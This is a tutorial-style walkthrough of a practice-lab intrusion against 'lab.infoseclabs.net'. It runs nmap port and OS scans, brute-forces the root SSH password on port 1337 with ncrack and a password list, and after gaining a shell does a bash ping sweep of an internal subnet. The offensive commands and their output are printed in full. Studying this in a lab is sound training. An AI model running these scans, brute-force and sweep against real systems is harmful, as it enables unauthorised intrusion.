# Lateral-recon

This is an introduction to Lateral Reconnaissance.  The target for this exercise is [infoseclabs](http://lab.infoseclabs.net).  At first glance, the site has examples to various attacks, but this is the tip of the iceberg.  One of the first steps in lateral recon is identifying things like open ports, or operating systems using [nmap](https://nmap.org)

```
:~ nmap lab.infoseclabs.net

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-14 19:20 PDT
Nmap scan report for lab.infoseclabs.net (99.47.80.53)
Host is up (0.050s latency).
rDNS record for 99.47.80.53: 99-47-80-53.uvs.sndgca.sbcglobal.net
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
:~
```
As demonstrated, the default nmap command does not produce significant results.  If you have not done this already, take a look at the documentation on the website, or simply look at the man page for nmap.  There are many parameters to experiment with but for the sake of keeping this topic short and to the point we're going to use this command.

```
:~ nmap -p0-10000 -v -O lab.infoseclabs.net
Not shown: 9999 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1337/tcp open  waste
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 6.010 days (since Sun May  8 19:37:19 2016)
TCP Sequence Prediction: Difficulty=263 (Good luck!)
```

This scan produces different results such as additional ports using the -p switch along with a port range of 0-10000.  You may want to adjust the range depending on the target and how much time you have.  I was also interested in determining an operating system hence the inclusion of -O.  I saw the list of ports and noticed one [unfamiliar](http://www.tcpipguide.com/free/t_CommonTCPIPApplicationsandAssignedWellKnownandRegi-2.htm) port (1337)  There are a lot of different types of scans to use, so reviewing the documentation along with trial and error will help you along the way.  With the scan results I tried connecting to the server and port using ssh, I was prompted with a password (which I obviously did not have).  I tried guessing a few common ones but after a few failed attempts, I decided to automate, and speed up the process by using a brute force tool.  

Some tools that come to mind are hydra, ncrack, and medusa.  After trial, error, and performance issues I decided on ncrack.  When using a tool like ncrack, you may also need a password file containing a list of common passwords discovered, which are readily available online.  Once you have one, you can run ncrack against your target using the password list.  Bear in mind, syntax is very important for this command so remain persistent if you get errors.  

```
 ncrack -v --user root -T5 -P path/to/file.txt ssh://lab.infoseclabs.net:1337
```

This command runs ncrack assuming the user is root, pointing to the password file at path/to/file.txt using SSH against lab.infoseclabs.net on port 1337.  The password was revealed and after attempting to use the password provided for root, I gained Shell access.  

BUT THIS IS JUST THE BEGINNING!

```
root@box:~# for i in `seq 1 255`; do ping -c 1 172.16.0.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done
	172.16.0.1
	172.16.0.10
	172.16.0.100
	172.16.0.102
	172.16.0.103
```

Now that I am on the inside, I want to get an awareness of what I gained access to, and what else I can see.  Getting a network address through ifconfig (ipconfig for those using Windows) tells me some details, but I also wanted to know what else I could see. With my IP address in mind, I wanted to see what else I could find on this subnet so I ran a ping scan on the subnet assuming a /24 network, and found some hosts.  
